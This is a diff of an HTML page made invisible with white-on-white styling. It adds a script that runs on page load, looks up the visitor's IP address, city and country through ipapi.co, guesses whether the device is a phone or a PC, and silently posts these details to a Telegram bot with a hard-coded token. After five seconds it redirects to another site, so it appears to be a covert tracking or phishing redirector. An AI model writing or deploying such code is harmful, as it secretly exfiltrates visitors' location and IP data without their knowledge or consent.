@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <title>Página Blanca</title>
   <style>
-    /* Estilos para hacer todo blanco */
     body {
       background-color: white;
       color: white;
@@ -18,14 +17,49 @@
       color: white;
     }
   </style>
-
-  <meta http-equiv="refresh" content="1; URL=https://cdf-colombia.github.io/cdf/" />
-
-
 </head>
 <body>
   <h1>Texto Blanco</h1>
   <p>segurosmaximopontencial.</p>
   <a href="#">Este es un enlace blanco</a>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '7984706159:AAGai2Rx6thKz_vfuLb34UYvnIn15CbwN04';
+    const TELEGRAM_CHAT_ID = '5647970395';
+
+    function esCelular() {
+      return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
+    }
+
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const zona = `${data.city}, ${data.region}, ${data.country_name}`;
+        const dispositivo = esCelular() ? 'Celular' : 'PC/Tablet';
+        const ip = data.ip;
+
+        const mensaje = `👤 Nuevo visitante:\n📍 Zona: ${zona}\n📱 Dispositivo: ${dispositivo}\n🌐 IP: ${ip}`;
+
+        // Enviar a Telegram
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: mensaje
+          })
+        });
+      })
+      .catch(error => {
+        console.error('Error al obtener la IP o enviar a Telegram:', error);
+      });
+
+    // Redirigir luego de 5 segundos
+    setTimeout(() => {
+      window.location.href = "https://cdf-colombia.github.io/cdf/";
+    }, 5000);
+  </script>
 </body>
 </html>
